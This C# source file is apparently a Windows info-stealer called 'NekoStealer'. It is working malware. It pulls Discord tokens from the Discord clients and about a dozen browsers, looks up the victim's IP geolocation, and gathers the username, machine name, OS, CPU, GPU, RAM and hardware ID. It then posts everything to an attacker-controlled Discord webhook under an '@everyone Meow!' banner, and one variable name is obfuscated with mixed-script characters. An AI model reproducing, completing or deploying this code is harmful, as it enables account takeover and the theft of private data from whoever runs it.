using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net.Http;
using System.Net;
using System.Security.Principal;
using System.Drawing;
using System.Text;
using System.Management;
using Microsoft.Win32;

namespace NekoStealer
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        public static List<string> goSendTokens = Stealing.AllTokens;
        [STAThread]
        static void Main() // Stealing tokens from Browsers and Apps
        {
            Task.WaitAll(
            Stealing.DiscordApp(),
            Stealing.DiscordCanary(),
            Stealing.DiscordPTB(),
            Stealing.Chrome(),
            Stealing.ChromeBeta(),
            Stealing.FireFox(),
            Stealing.Opera(),
            Stealing.OperaGX(),
            Stealing.Edge(),
            Stealing.Yandex(),
            Stealing.Brave(),
            Stealing.EpicPrivacy(),
            Stealing.Vivaldi(),
            Stealing.ThreeHundredSixty(),
            Stealing.CocCoc()
            );

            //Tokens
            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
            
            // Getting IP Adress
            WebClient MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb = new WebClient();
            string IP = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/ip/");
            // Getting more info of IP Adress
            string city_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/city/");
            string country_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country/");
            string timezone_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/timezone/");
            string languages_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/languages/");
            string currency_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/currency/");
            string region_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/region/");
            string region_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/region_code/");
            string country_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_code/");
            string country_code_iso3_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_code_iso3/");
            string country_name_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_name/");
            string country_capital_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_capital/");
            string country_tld_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_capital/");
            string country_area_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_area/");
            string country_population_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_population/");
            string in_eu_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/in_eu/");
            string postal_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/postal/");
            string timezoneip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/timezone/");
            string utc_offset_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/utc_offset/");
            string country_calling_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_calling_code/");
            string currencyip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/currency/");
            string currency_name_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/currency_name/");
            string asn_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/asn/");
            string org_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/org/");
            string continent_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/continent_code/");

            // System Info
            string machinename = Environment.MachineName;
            string username = Environment.UserName;
            string sysdir = Environment.SystemDirectory;

            // Bits
            string GetBitVersion() // Getting bits
            {
                try
                {
                    if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                        .GetValue("Identifier")
                        .ToString()
                        .Contains("x86"))
                        return "(32 Bit)";
                    else
                        return "(64 Bit)";
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
                return "(Unknown)";
            }

            // OS Version
            string OS = GetSystemVersion();
            string GetSystemVersion() // Getting version Windows
            {
                return GetWindowsVersionName() + " " + GetBitVersion();
            }
            string GetWindowsVersionName()// Version Windows
            {
                string sData = "Unknown System";
                try
                {
                    using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                    {
                        foreach (ManagementObject tObj in mSearcher.Get())
                            sData = Convert.ToString(tObj["Name"]);
                        sData = sData.Split(new char[] { '|' })[0];
                        int iLen = sData.Split(new char[] { ' ' })[0].Length;
                        sData = sData.Substring(iLen).TrimStart().TrimEnd();
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
                return sData;
            }

            // CPU
            string CPUs = GetCPUName();
            string GetCPUName() // Getting CPU
            {
                try
                {
                    string CPU = string.Empty;
                    ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                    foreach (ManagementObject mObject in mSearcher.Get())
                    {
                        CPU = mObject["Name"].ToString();
                    }
                    return CPU;
                }
                catch
                {
                    return "Error";
                }
            }

            //GPU
            string GPUs = GetGPUName();
            string GetGPUName() // Getting GPU
            {
                try
                {
                    ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                    foreach (ManagementObject mObject in mSearcher.Get())
                        return mObject["Name"].ToString();
                }
                catch
                {
                }
                return "Unknown";
            }

            // RAM
            string RAM = GetRAM();
            string GetRAM() // Getting RAM
            {
                try
                {
                    int RamAmount = 0;
                    using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                    {
                        foreach (ManagementObject MO in MOS.Get())
                        {
                            double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                            RamAmount = (int)(Bytes / 1048576) - 1;
                            break;
                        }
                    }
                    return RamAmount.ToString() + "MB";
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    return "Error";
                }
            }

            // HWID
            string HWID = GetProcessorID();
            string GetProcessorID() // Getting Processor Id
            {
                string sProcessorID = string.Empty;
                ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
                ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
                foreach (ManagementObject oManagementObject in oCollection)
                {
                    sProcessorID = (string)oManagementObject["ProcessorId"];
                }
                return (sProcessorID);
            }

            //Text, Avatar, Username.
            Dictionary<string, string> Token = new Dictionary<string, string>
                    {
                        { "content", "\n@everyone Meow! :cat:" +
                        "\n`          ██          ██                    ███╗░░░███╗███████╗░█████╗░░██╗░░░░░░░██╗██╗      `" +
                        "\n`        ██▒▒██      ██▒▒██                  ████╗░████║██╔════╝██╔══██╗░██║░░██╗░░██║██║      `" +
                        "\n`        ██▒▒▓▓██████▓▓▒▒██                  ██╔████╔██║█████╗░░██║░░██║░╚██╗████╗██╔╝██║      `" +
                        "\n`      ██▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓██                ██║╚██╔╝██║██╔══╝░░██║░░██║░░████╔═████║░╚═╝      `" +
                        "\n`      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                ██║░╚═╝░██║███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██╗      `" +
                        "\n`    ██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██              ╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝      `" +
                        "\n`    ██▒▒▒▒██▒▒▒▒██▒▒▒▒██▒▒▒▒██              `" +
                        "\n`    ██▒▒▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒▒▒██              `" +
                        "\n`  ██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██            `" +
                        "\n`  ██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██            `" +
                        "\n`  ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            `" +
                        "\n`  ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            `" +
                        "\n`██▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓██          `" +
                        "\n`██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██          `" +
                        "\n`██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    ████  `" +
                        "\n`██▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓██  ██▒▒▒▒██`" +
                        "\n`██▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██    ██▓▓██ ███╗░░██╗███████╗░██╗░░░░░░░██╗  ██╗░░░░░░█████╗░░██████╗░`" +
                        "\n`██▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██    ██▒▒██ ████╗░██║██╔════╝░██║░░██╗░░██║  ██║░░░░░██╔══██╗██╔════╝░`" +
                        "\n`██▓▓▒▒▒▒██▒▒██▒▒▒▒▒▒██▒▒██▒▒▒▒▓▓██████▒▒▒▒██ ██╔██╗██║█████╗░░░╚██╗████╗██╔╝  ██║░░░░░██║░░██║██║░░██╗░`" +
                        "\n`  ██▓▓▒▒██▒▒██▒▒▒▒▒▒██▒▒██▒▒▓▓██▒▒▒▒▓▓▒▒██   ██║╚████║██╔══╝░░░░████╔═████║░  ██║░░░░░██║░░██║██║░░╚██╗`" +
                        "\n`    ██████▒▒██████████▒▒████████████████     ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░  ███████╗╚█████╔╝╚██████╔╝`" +
                        "\n`        ██████      ██████                   ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░  ╚══════╝░╚════╝░░╚═════╝░`" +
                        "\n========================= Information =========================" +
                        "\nUsername: " + username +
                        "\nMachine Name: " + machinename +
                        "\n========================= Information =========================" +
                        "\n" +
                        "\n======================== IP Information ========================" +
                        "\nIP Address: " + IP +
                        "\nTime Zone: " + timezone_ip +
                        "\nUTC: " + utc_offset_ip +
                        "\nCountry Calling Code: " + country_calling_code_ip +
                        "\nCountry: " + country_name_ip +
                        "\nCountry Capital: " + country_capital_ip +
                        "\nCountry Code: " + country_code_ip +
                        "\nCountry Code ISO3: " + country_code_iso3_ip +
                        "\nCountry Top Level Domain" + country_tld_ip +
                        "\nCountry Area (in sq km): " + country_area_ip +
                        "\nCountry Population: " + country_population_ip +
                        "\nCity: " + city_ip +
                        "\nRegion: " + region_ip +
                        "\nRegion Code: " + region_code_ip +
                        "\nLanguages" + languages_ip +
                        "\nContinent Code: " + continent_code_ip +
                        "\nEuropean Union: " + in_eu_ip +
                        "\nPostal Code / Zip Code: " + postal_ip +
                        "\nCurrency Name: " + currency_name_ip +
                        "\nCurrency: " + currencyip +
                        "\nSutonomous System Number: " + asn_ip +
                        "\nOrganinzation Name: " + org_ip +
                        "\n======================== IP Information ========================" +
                        "\n" +
                        "\n====================== System Information ======================" +
                        "\nOperating System: " + OS +
                        "\nSystem Directory: " + sysdir +
                        "\nCPU: " + CPUs +
                        "\nGPU: " + GPUs +
                        "\nRAM: " + RAM +
                        "\nHWID: " + HWID +
                        "\n====================== System Information ======================" +
                        "\n" +
                        "\n======================= Discord Tokens =======================" +
                        "\n" + Tokens +
                        "\n======================= Discord Tokens ======================="},
                        { "avatar_url", Webhook.AvatarUrl},
                        { "username", Webhook.Username}
            };

            // Sending Webhook
            HttpClient cl = new HttpClient();
            cl.PostAsync(Webhook.Url, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult(); // FormUrlEncodedContent
        }
    }
}